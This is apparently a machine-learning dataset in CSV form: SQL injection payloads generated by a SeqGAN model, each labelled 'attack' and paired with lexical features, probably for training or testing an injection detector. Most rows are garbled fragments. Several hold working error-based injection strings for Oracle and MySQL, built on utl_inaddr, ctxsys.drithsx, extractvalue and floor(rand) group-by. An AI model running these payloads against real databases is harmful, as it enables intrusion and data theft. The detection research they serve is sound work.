label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1%%whenl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,408,8.0,7.0,2.75,5.0,1.0,0.0,2.0,0.625,0.125,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1au,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,409,3.0,3.0,1.584962500721156,2.0,1.0,0.0,0.0,0.6666666666666666,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1"" like ""y0x717a767a71W4607wheresI.sysb'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,410,46.0,24.0,4.278252988336485,20.0,14.0,6.0,6.0,0.43478260869565216,0.30434782608695654,0.13043478260869565,0.13043478260869565,2.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1h%_*2bzB3074ui9740:asywo' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ntzqww  5000000eaacLUsy}7562wu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,411,384.0,47.0,4.096084849139732,119.0,65.0,139.0,61.0,0.3098958333333333,0.16927083333333334,0.3619791666666667,0.15885416666666666,2.0,0.0,0.0,0.0,1.0,2.0,0.0,28.0,1.0,4.0,0.0,23.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-xzel,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,412,5.0,5.0,2.321928094887362,4.0,0.0,0.0,1.0,0.8,0.0,0.0,0.2,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,413,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%^,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,414,3.0,3.0,1.584962500721156,0.0,1.0,0.0,2.0,0.0,0.3333333333333333,0.0,0.6666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"""adjNbnlt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,415,9.0,9.0,3.169925001442312,8.0,0.0,0.0,1.0,0.8888888888888888,0.0,0.0,0.1111111111111111,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-M5023  having end  ||chho_ltnwt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,416,32.0,22.0,4.215018266288633,19.0,4.0,5.0,4.0,0.59375,0.125,0.15625,0.125,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1hoc_sju,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,417,8.0,8.0,3.0,6.0,1.0,0.0,1.0,0.75,0.125,0.0,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,17319xn  >lltu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,418,14.0,11.0,3.3787834934861753,6.0,5.0,2.0,1.0,0.42857142857142855,0.35714285714285715,0.14285714285714285,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""erehx.end=ljhrcfloorounq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,419,359.0,36.0,3.7113419943286474,106.0,49.0,144.0,60.0,0.29526462395543174,0.13649025069637882,0.4011142061281337,0.1671309192200557,0.0,2.0,0.0,0.0,0.0,3.0,0.0,30.0,1.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1  )' like '     )    )    (  =  (a0x717a767a71,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,420,47.0,15.0,2.95644057807591,8.0,10.0,21.0,8.0,0.1702127659574468,0.2127659574468085,0.44680851063829785,0.1702127659574468,2.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-x'  =  ''  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,421,16.0,5.0,1.875,1.0,0.0,8.0,7.0,0.0625,0.0,0.5,0.4375,4.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,gunl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,422,4.0,4.0,2.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,'  =  'bl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,423,9.0,5.0,2.0588138903312014,2.0,0.0,4.0,3.0,0.2222222222222222,0.0,0.4444444444444444,0.3333333333333333,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""%"" like ""w.||gowh4106  =r  ,concatfloor,0x717a767a71       ),casecdEhr  ||c_azulabgf   
*",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,424,91.0,37.0,4.630791827145773,42.0,14.0,19.0,16.0,0.46153846153846156,0.15384615384615385,0.2087912087912088,0.17582417582417584,0.0,3.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,3.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1r4822_.pr.(  2aadl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,425,19.0,13.0,3.5766176449086657,7.0,6.0,2.0,4.0,0.3684210526315789,0.3157894736842105,0.10526315789473684,0.21052631578947367,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"11%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""b""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""j""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""6236yua' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,426,934.0,45.0,3.837436722029681,292.0,154.0,376.0,112.0,0.31263383297644537,0.16488222698072805,0.4025695931477516,0.11991434689507495,2.0,6.0,0.0,0.0,2.0,5.0,0.0,71.0,1.0,2.0,20.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,1.0,3.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,1'a,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,427,3.0,3.0,1.584962500721156,1.0,1.0,0.0,1.0,0.3333333333333333,0.3333333333333333,0.0,0.3333333333333333,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,428,330.0,35.0,3.618831778032794,91.0,45.0,136.0,58.0,0.27575757575757576,0.13636363636363635,0.4121212121212121,0.17575757575757575,1.0,2.0,0.0,0.0,0.0,2.0,0.0,28.0,1.0,3.0,0.0,22.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1qs,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,429,3.0,3.0,1.584962500721156,2.0,1.0,0.0,0.0,0.6666666666666666,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-%benchmark%0x4b774c75  4386  6055  )   then   5305  113  cased,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,430,63.0,25.0,4.102058249096462,21.0,22.0,16.0,4.0,0.3333333333333333,0.3492063492063492,0.25396825396825395,0.06349206349206349,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1%et_lb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,431,7.0,7.0,2.8073549220576037,4.0,1.0,0.0,2.0,0.5714285714285714,0.14285714285714285,0.0,0.2857142857142857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-6236  112    )  ||chra x,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,432,25.0,13.0,3.182683189255492,5.0,7.0,9.0,4.0,0.2,0.28,0.36,0.16,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack, when  122    )    )    thenxau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,433,31.0,12.0,2.7411847318666243,11.0,3.0,15.0,2.0,0.3548387096774194,0.0967741935483871,0.4838709677419355,0.06451612903225806,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'brandw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,434,266.0,37.0,4.0400237150391565,106.0,35.0,93.0,32.0,0.39849624060150374,0.13157894736842105,0.34962406015037595,0.12030075187969924,2.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,1.0,2.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1%&ert  (        (  )   )      (  6237   )    having1 groupx  (  =  )   6055  )having   ax by 1 byuvkICzdz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,435,106.0,33.0,3.6269073364716315,35.0,11.0,48.0,12.0,0.330188679245283,0.10377358490566038,0.4528301886792453,0.11320754716981132,0.0,0.0,0.0,0.0,0.0,1.0,0.0,9.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%concat  having Do.u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,436,21.0,15.0,3.7849418274376427,15.0,1.0,3.0,2.0,0.7142857142857143,0.047619047619047616,0.14285714285714285,0.09523809523809523,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,oeu2,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,437,4.0,4.0,2.0,3.0,1.0,0.0,0.0,0.75,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,18844lu_j5wb(  cast orxcbt_nl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,438,29.0,20.0,4.21126073643228,17.0,6.0,3.0,3.0,0.5862068965517241,0.20689655172413793,0.10344827586206896,0.10344827586206896,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack, '  SELECT1,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,439,11.0,8.0,2.8453509366224368,6.0,1.0,3.0,1.0,0.5454545454545454,0.09090909090909091,0.2727272727272727,0.09090909090909091,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select 'a   ' like 'from(  5840jud  )    )    me  aT  0x7171706a71m{.r  4232  (  (,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,440,91.0,33.0,4.021369777490011,26.0,19.0,32.0,14.0,0.2857142857142857,0.2087912087912088,0.3516483516483517,0.15384615384615385,4.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,156066,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,441,6.0,4.0,1.792481250360578,0.0,6.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-WHERE2131u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,442,11.0,9.0,3.095795255000934,6.0,4.0,0.0,1.0,0.5454545454545454,0.36363636363636365,0.0,0.09090909090909091,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
